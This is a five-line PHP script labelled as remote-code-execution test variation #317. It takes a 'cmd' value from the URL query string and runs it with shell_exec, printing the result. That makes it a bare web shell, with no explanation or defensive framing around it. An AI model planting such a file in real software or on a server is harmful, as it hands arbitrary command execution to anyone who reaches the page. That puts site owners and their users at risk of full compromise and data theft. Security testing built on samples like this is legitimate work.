<?php
// RCE test variation #317
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>